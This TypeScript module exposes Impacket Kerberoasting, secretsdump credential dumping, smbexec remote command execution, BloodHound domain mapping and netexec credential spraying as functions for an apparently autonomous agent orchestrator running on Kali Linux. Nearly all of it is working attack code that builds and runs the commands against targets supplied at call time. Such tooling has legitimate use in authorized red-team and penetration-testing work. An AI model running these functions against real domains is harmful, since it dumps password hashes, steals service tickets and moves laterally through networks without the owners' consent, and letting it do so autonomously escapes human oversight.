/**
 * Kali Linux Active Directory Attack Bridge
 *
 * Exposes Impacket scripts (secretsdump, GetUserSPNs, smbexec) natively
 * to the Republic orchestrator to allow lateral movement and identity graphing.
 */

import { kaliExec } from "./kali-agent-loop.js";

export interface AdAttackResult {
  ok: boolean;
  output: string;
  exitCode: number;
}

function sanitizeAuth(str: string): string {
  // Only allow alphanumeric and basic special chars for passwords/usernames safely within single quotes
  return str.replace(/'/g, "'\\''");
}

function sanitizeTarget(str: string): string {
  return str.replace(/[^a-zA-Z0-9_\-.]/g, "");
}

/**
 * Executes GetUserSPNs.py (Kerberoasting)
 * @param domain Target domain (e.g. contoso.com)
 * @param username Authenticated user
 * @param password Authenticated password (or hash)
 * @param targetDc Target Domain Controller IP
 */
export async function impacketKerberoast(
  domain: string,
  username: string,
  password: string,
  targetDc: string
): Promise<AdAttackResult> {
  const safeDomain = sanitizeTarget(domain);
  const safeUser = sanitizeAuth(username);
  const safePass = sanitizeAuth(password);
  const safeDc = sanitizeTarget(targetDc);

  // Note: Most Kali distributions package impacket scripts without the .py extension natively in PATH.
  // E.g., GetUserSPNs.py -> impacket-GetUserSPNs or GetUserSPNs
  // We'll use python3 -m impacket.examples... or just the binary if available.
  const cmd = `impacket-GetUserSPNs -request -dc-ip '${safeDc}' '${safeDomain}/${safeUser}:${safePass}'`;
  const result = await kaliExec(cmd, 120);

  return {
    ok: result.ok,
    output: result.stdout || result.stderr || "",
    exitCode: result.exitCode,
  };
}

/**
 * Executes secretsdump.py
 * @param target Target IP or Hostname
 * @param domain Target domain
 * @param username Authenticated user
 * @param password Authenticated password (or hash)
 */
export async function impacketSecretsDump(
  target: string,
  domain: string,
  username: string,
  password: string
): Promise<AdAttackResult> {
  const safeTarget = sanitizeTarget(target);
  const safeDomain = sanitizeTarget(domain);
  const safeUser = sanitizeAuth(username);
  const safePass = sanitizeAuth(password);

  const cmd = `impacket-secretsdump '${safeDomain}/${safeUser}:${safePass}@${safeTarget}'`;
  const result = await kaliExec(cmd, 300); // AD dumps can be large, allow 5 mins

  return {
    ok: result.ok,
    output: result.stdout || result.stderr || "",
    exitCode: result.exitCode,
  };
}

/**
 * Executes smbexec.py for lateral movement / command execution
 * @param target Target IP or Hostname
 * @param domain Target domain
 * @param username Authenticated user
 * @param password Authenticated password (or hash)
 * @param command Command to execute remotely
 */
export async function impacketSmbExec(
  target: string,
  domain: string,
  username: string,
  password: string,
  command: string
): Promise<AdAttackResult> {
  const safeTarget = sanitizeTarget(target);
  const safeDomain = sanitizeTarget(domain);
  const safeUser = sanitizeAuth(username);
  const safePass = sanitizeAuth(password);
  
  // Clean command heavily to prevent breaking out of the quote block locally
  const safeCommand = sanitizeAuth(command);

  // Execute a single command and exit
  const scriptCmd = `impacket-smbexec -no-echo '${safeDomain}/${safeUser}:${safePass}@${safeTarget}' -c '${safeCommand}'`;
  const result = await kaliExec(scriptCmd, 60);

  return {
    ok: result.ok,
    output: result.stdout || result.stderr || "",
    exitCode: result.exitCode,
  };
}

/**
 * Executes bloodhound-python logic to ingest directory mapping mathematically.
 * Outputs generated ziplogs inside the Kali container path.
 */
export async function adBloodhoundIngest(
  domain: string,
  username: string,
  password: string,
  targetDc: string
): Promise<AdAttackResult> {
  const safeDomain = sanitizeTarget(domain);
  const safeUser = sanitizeAuth(username);
  const safePass = sanitizeAuth(password);
  const safeDc = sanitizeTarget(targetDc);

  // Ingests domain AD graph and zips output to /tmp for retrieval
  const cmd = `cd /tmp && bloodhound-python -d '${safeDomain}' -u '${safeUser}' -p '${safePass}' -c All -ns '${safeDc}'`;
  const result = await kaliExec(cmd, 300); // 5 minutes max as AD graphs can be huge

  return {
    ok: result.ok,
    output: result.stdout || result.stderr || "",
    exitCode: result.exitCode,
  };
}

/**
 * Executes netexec (CrackMapExec modernized) to spray credentials or list smb shares autonomously.
 */
export async function adNetExecSpray(
  target: string,
  protocol: string,
  username: string,
  password: string,
  extras: string = ""
): Promise<AdAttackResult> {
  const safeTarget = sanitizeTarget(target);
  const safeProtocol = protocol.replace(/[^a-z]/g, ""); // e.g. smb, winrm, wmi, rdp
  const safeUser = sanitizeAuth(username);
  const safePass = sanitizeAuth(password);
  
  // Safe filtering: allow basic flags like --shares, --sessions but omit complex backticks
  const safeExtras = extras.replace(/['";&$`|]/g, "").trim();

  // example: netexec smb 192.168.1.0/24 -u 'admin' -p 'password' --shares
  const cmd = `netexec ${safeProtocol} '${safeTarget}' -u '${safeUser}' -p '${safePass}' ${safeExtras}`;
  const result = await kaliExec(cmd, 300);

  return {
    ok: result.ok,
    output: result.stdout || result.stderr || "",
    exitCode: result.exitCode,
  };
}
